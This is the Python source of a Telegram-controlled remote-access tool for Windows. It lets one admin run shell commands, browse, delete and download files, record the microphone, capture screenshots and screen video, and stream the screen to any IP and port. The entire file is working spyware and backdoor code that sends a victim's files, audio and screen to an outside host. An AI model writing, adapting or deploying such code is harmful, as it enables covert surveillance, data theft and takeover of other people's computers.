import subprocess
import pyautogui
import pyaudio
import socket
import pickle
import struct
import time
import wave
import cv2
import os

import numpy as np

from ctypes  import windll
from telebot import TeleBot
from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
from PIL import Image

# Variables
API_TOKEN = "token" 

ADMIN = <id>

filename_audio = "recorded_audio.wav"
filename_video = "video1.avi"
filename_screenshot = "screenshot.jpg"

width = windll.user32.GetSystemMetrics(0)
height = windll.user32.GetSystemMetrics(1)
SREEN_SIZE = (width, height)
fourcc = cv2.VideoWriter_fourcc(*"XVID")

chunk = 2048
FORMAT = pyaudio.paInt16
channels = 1
sample_rate = 44100

bot = TeleBot(API_TOKEN)

bot.send_message(ADMIN, "ON ✅")

markup = ReplyKeyboardMarkup(True, True)
markup.add(KeyboardButton("cd"), KeyboardButton("cd_path"),
           KeyboardButton("dir"), KeyboardButton("del"),
           KeyboardButton("get_file"), KeyboardButton("exec_cmd"), 
           KeyboardButton("record_audio"), KeyboardButton("dump_audio"),
           KeyboardButton("record_video"), KeyboardButton("get_video"),
           KeyboardButton("screenshot"), KeyboardButton("getscreen"))


# Fn(1)
def create_markup(markup):
    list_files = os.listdir(os.getcwd())
    for i in list_files:
        markup.add(i)
        
    markup.add("None")

def recordAUDIO(time=6):
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=channels,
                    rate=sample_rate,
                    input=True,
                    output=True,
                    frames_per_buffer=chunk)
    
    frames = []
    for i in range(int(sample_rate / chunk * time)):
        data = stream.read(chunk)
        frames.append(data)

        with open('dump_record_audio.dat', 'wb') as dump_out:
            pickle.dump(frames, dump_out, protocol=3)

    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(filename_audio, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(sample_rate)

    wf.writeframes(b"".join(frames))
    
    wf.close()

def checkID(ms):
    if ms.from_user.id == ADMIN:
        return True
    else:
        info = f"""
        Name - {ms.from_user.first_name}
        Surname - {ms.from_user.last_name}
        UserName - {ms.from_user.username}
        Language - {ms.from_user.language_code}
        """
        bot.send_message(ADMIN, "USED:")
        bot.send_message(ADMIN, info)
        return False


# Fn(2)
def cd(ms):
    output = os.getcwd()
    bot.send_message(ADMIN, output, reply_markup=markup)

def cd_path(ms):
    markup_cd = ReplyKeyboardMarkup()
    create_markup(markup_cd)
    markup_cd.add("..")
    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_cd)
    
    @bot.message_handler(content_types=["text"])
    def exec_cd_path_next(ms):
        if ms.text != "None":
            try:
                path = ms.text
                os.chdir(path)
                output = os.getcwd()
                bot.send_message(ADMIN, output)
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")
                
        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)

    bot.register_next_step_handler(ms, exec_cd_path_next)

def dir(ms):
    try:
        list_files = os.listdir(os.getcwd())
        list_files = '\n'.join(list_files)
        
        if list_files:
            bot.send_message(ADMIN, list_files, reply_markup=markup)
        else:
            bot.send_message(ADMIN, "<Empty>", reply_markup=markup)
    except Exception as e:
        bot.send_message(ADMIN, f"Error:\n{e}")

def del_file(ms):
    markup_del = ReplyKeyboardMarkup()
    create_markup(markup_del)
    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_del)

    @bot.message_handler(content_types=["text"])
    def del_file_next(ms):
        if ms.text != "None":
            try:
                path_file = ms.text
                os.remove(path_file)
                bot.send_message(ADMIN, "File removed ✅")
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)

    bot.register_next_step_handler(ms, del_file_next)

def get_file(ms):
    markup_file = ReplyKeyboardMarkup()
    create_markup(markup_file)
    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_file)
    
    @bot.message_handler(content_types=["text"])
    def get_file_next(ms):
        if ms.text != "None":
            try:
                path = ms.text
                bot.send_document(ADMIN, open(path, "rb"))
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)

    bot.register_next_step_handler(ms, get_file_next)

def get_video(ms):
    markup_video = ReplyKeyboardMarkup()
    create_markup(markup_video)
    bot.send_message(ADMIN, "Enter path...", reply_markup=markup_video)
    
    @bot.message_handler(content_types=["text"])
    def get_video_next(ms):
        if ms.text != "None":
            try:
                path = ms.text
                bot.send_video(ADMIN, open(path, "rb"))
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.send_message(ADMIN, "ㅤ", reply_markup=ReplyKeyboardRemove())
        bot.send_message(ADMIN, "ㅤ", reply_markup=markup)

    bot.register_next_step_handler(ms, get_video_next)

def exec_cmd(ms):
    bot.send_message(ADMIN, "Enter command...")

    @bot.message_handler(content_types=["text"])
    def exec_cmd_next(ms):
        try:
            cmd = ms.text
            output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = output.stdout + output.stderr
            if output:
                bot.send_message(ADMIN, output, reply_markup=markup)
            else:
                bot.send_message(ADMIN, "<Empty>", reply_markup=markup)
        except Exception as e:
            bot.send_message(ADMIN, f"Error:\n{e}")

    bot.register_next_step_handler(ms, exec_cmd_next)

def record_audio(ms):
        bot.send_message(ADMIN, "Enter time, quantity iteration...", reply_markup=markup)
        
        @bot.message_handler(content_types=["text"])
        def record_audio_next(ms):
            try:
                list_data = ms.text.split(" ")
                time = int(list_data[0])
                quantity = int(list_data[1])
                bot.send_message(ADMIN, "Recording 🎲")
                
                for i in range(quantity):
                    recordAUDIO(time)
                    with open(filename_audio, 'rb') as audio:
                        bot.send_audio(ADMIN, audio)
                
                os.remove(filename_audio)
                bot.send_message(ADMIN, "Finished recording ✅")
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.register_next_step_handler(ms, record_audio_next)

def dump_audio(ms):
    with open("dump_record_audio.dat", "rb") as dump_in:
        unpickler = pickle.Unpickler(dump_in)
        frame = unpickler.load()

        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                        channels=channels,
                        rate=sample_rate,
                        input=True,
                        output=True,
                        frames_per_buffer=chunk)
        
        wf = wave.open(filename_audio, "wb")
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(sample_rate)
        wf.writeframes(b"".join(frame))
        wf.close()
        
        bot.send_message(ADMIN, "Unpacked ✅", reply_markup=markup)
        
        with open(filename_audio, "rb") as audio:
            bot.send_audio(ADMIN, audio)
        
        os.remove(filename_audio)

def record_video(ms):
    bot.send_message(ADMIN, "Recording 🎲", reply_markup=markup)
    
    while True:
        stop_time = round(time.time()) + 70

        while os.path.exists(filename_video):
            index = filename_video[5:-4]
            filename_video = filename_video[:-5] + str(int(index) + 1) + ".avi"

        out = cv2.VideoWriter(filename=filename_video, fourcc=fourcc, fps=15.0, frameSize=(SREEN_SIZE))

        while True:
            if round(time.time()) == stop_time:
                cv2.destroyAllWindows()
                out.release()
                break
            
            frame = pyautogui.screenshot()
            frame = np.array(frame)
            
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)

def screenshot(ms):
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save("screenshot.jpg")

    with open(filename_screenshot, "rb") as photo:
        bot.send_photo(ADMIN, photo, reply_markup=markup)
    
    os.remove(filename_screenshot)

def getscreen(ms):
    bot.send_message(ADMIN, "Enter port, ip...")
    
    @bot.message_handler(content_types=["text"])
    def getscreen_next(ms):
        try:
            list_data = ms.text.split()
            PORT = int(list_data[0])
            IP = list_data[1]

            clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            while True:
                try:
                    bot.send_message(ADMIN, "Connection attempt 🎲")
                    clientsocket.connect((IP, PORT))
                    break
                except Exception as e:
                    bot.send_message(ADMIN, "Сonnection error ❌")
                    time.sleep(10)

            bot.send_message(ADMIN, "Successful connection ✅")
            while True:
                image = pyautogui.screenshot()
                image = image.resize((1440, 900))
                image = np.array(image)
                img = Image.frombytes('RGB', (1440, 900), image)
                data = pickle.dumps(np.array(img))
                clientsocket.sendall(struct.pack("L", len(data)) + data)
        except Exception as e:
            bot.send_message(ADMIN, f"Error:\n{e}")
    
    bot.register_next_step_handler(ms, getscreen_next)

# Start
@bot.message_handler(commands=["_start"])
def send_welcome(ms):
    if checkID(ms):
        bot.send_message(ADMIN, text="ㅤ", reply_markup=markup)


@bot.message_handler(content_types=["text"])
def CheckCommand(ms):
    if checkID(ms):
        try:
            globals()[ms.text](ms)
        except KeyError:
            bot.send_message(ADMIN, "Function not found")
        except Exception as e:
            bot.send_message(ADMIN, e)

bot.infinity_polling()